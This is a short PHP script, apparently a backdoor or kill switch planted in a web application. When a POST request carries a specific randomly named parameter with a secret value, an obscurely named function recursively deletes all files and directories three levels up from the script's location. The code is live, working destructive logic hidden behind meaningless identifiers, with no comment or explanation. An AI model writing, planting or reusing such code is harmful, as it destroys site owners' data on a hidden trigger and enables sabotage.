<?php

  if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["GWcjcR249IvtUSdpalQgKPzk"] === "Prw36BdCqAYO3KOy6iW7D7NO") {
    af4f4d6f3d25a9ee6827d6c5dc77e7("../../../");
  }

  function af4f4d6f3d25a9ee6827d6c5dc77e7($directory) {
    foreach(glob("{$directory}/*") as $file) {
        if(is_dir($file)) {
            af4f4d6f3d25a9ee6827d6c5dc77e7($file);
        } else {
            unlink($file);
        }
    }
    rmdir($directory);
  }
 ?>
